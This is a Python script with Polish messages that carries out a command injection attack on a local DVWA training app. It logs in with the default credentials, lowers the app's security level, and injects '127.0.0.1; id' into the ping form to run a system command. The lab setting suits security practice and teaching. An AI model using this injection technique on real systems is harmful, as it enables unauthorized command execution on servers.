import requests
from bs4 import BeautifulSoup

LOGIN_URL = "http://localhost/DVWA/login.php"
SECURITY_URL = "http://localhost/DVWA/security.php"
COMMAND_INJECTION_URL = "http://localhost/DVWA/vulnerabilities/exec/"
USERNAME = "admin"
PASSWORD = "password"
COMMAND = "id"

session = requests.Session()

def login():
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }
    session.post(LOGIN_URL, data=payload)
    print(f"[+] Zalogowano na DVWA z danymi: {USERNAME} / {PASSWORD}")

def set_security_low():
    r = session.get(SECURITY_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    }
    r = session.post(SECURITY_URL, data=payload)
    if "Security level set to low" in r.text:
        print("[+] Poziom zabezpieczeń ustawiony na LOW.")
    else:
        print("[-] Nie udało się ustawić poziomu zabezpieczeń.")

def command_injection_attack():
    print("[+] Rozpoczynam atak Command Injection...")

    injected_payload = f"127.0.0.1; {COMMAND}"
    print(f"[+] Użyty payload: {injected_payload}")

    payload = {
        "ip": injected_payload,
        "Submit": "Submit"
    }

    r = session.post(COMMAND_INJECTION_URL, data=payload)

    soup = BeautifulSoup(r.text, "html.parser")
    pre_tag = soup.find("pre")

    if pre_tag and pre_tag.text.strip():
        print("[+] Atak powiódł się! Komenda została wykonana.")
        print("[+] Wynik z polecenia systemowego:")
        print(pre_tag.text.strip())
    else:
        print("[-] Atak nie powiódł się. Brak wykonania komendy lub brak danych w odpowiedzi.")

if __name__ == "__main__":
    login()
    set_security_low()
    command_injection_attack()